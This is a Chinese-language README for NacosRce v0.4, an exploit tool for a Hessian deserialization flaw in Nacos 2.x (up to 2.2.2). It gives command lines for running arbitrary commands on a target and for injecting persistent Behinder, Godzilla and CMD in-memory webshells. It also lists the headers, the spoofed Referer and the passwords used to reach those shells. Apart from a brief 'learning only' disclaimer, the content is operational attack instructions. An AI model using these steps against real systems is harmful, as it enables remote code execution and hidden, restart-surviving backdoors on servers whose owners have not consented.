## Nacos Hessian 反序列化漏洞利用工具 v0.4

```latex

  _   _                     ____          
 | \ | | __ _  ___ ___  ___|  _ \ ___ ___ 
 |  \| |/ _` |/ __/ _ \/ __| |_) / __/ _ \
 | |\  | (_| | (_| (_) \__ \  _ < (_|  __/
 |_| \_|\__,_|\___\___/|___/_| \_\___\___|
```
<br />Author: 刨洞安全 && 凉风<br />
<br />注意：工具仅供学习使用，请勿滥用，否则后果自负！

<br />**食用方式 **<br />
1. 执行无回显命令（不推荐，因为每次重启nacos都会自动执行一次）
   <br />java -jar NacosRce.jar ip:port "command"
2. 同时注入冰蝎&哥斯拉&CMD内存马（推荐，重启后自动注入内存马）
   <br />java -jar NacosRce.jar ip:port memshell
3. 如果nacos是windows的：
   <br />java -jar NacosRce.jar ip:port memshell windows

<br />内存马说明：
<br />一、冰蝎内存马：
   <br />1、需要设置请求头x-client-data:rebeyond
   <br />2、设置Referer:https://www.google.com/
   <br />3、路径随意
   <br />4、密码rebeyond
   ![img.png](img.png)
<br />二、哥斯拉内存马：
   <br />1、需要设置请求头x-client-data:godzilla
   <br />2、设置Referer:https://www.google.com/
   <br />3、路径随意
   <br />4、密码是pass 和 key
<br />![img_1.png](img_1.png)
<br />三、CMD内存马：
   <br />1、需要设置请求头x-client-data:cmd
   <br />2、设置Referer:https://www.google.com/
   <br />3、请求头cmd:要执行的命令
<br />![img_2.png](img_2.png)
v0.4版本实现了：
<br />1、不出网漏洞利用
<br />2、可多次发起漏洞利用
<br />3、注入冰蝎/CMD内存马
<br />4、内存马对多版本进行了兼容
<br />5、修复windows的bug
<br />tips:
<br />1、请用jdk1.8
<br />2、适用于 Nacos 2.x <= 2.2.2
<br />3、非集群的也能打哦
<br />4、此内存马重启nacos依然存活

项目地址：https://github.com/c0olw/NacosRce
<br />参考文章
<br />[https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/](https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/)
<br />[https://exp.ci/2023/06/14/Nacos-JRaft-Hessian-反序列化分析/](https://exp.ci/2023/06/14/Nacos-JRaft-Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/)
<br />[https://github.com/Y4er/ysoserial](https://github.com/Y4er/ysoserial)
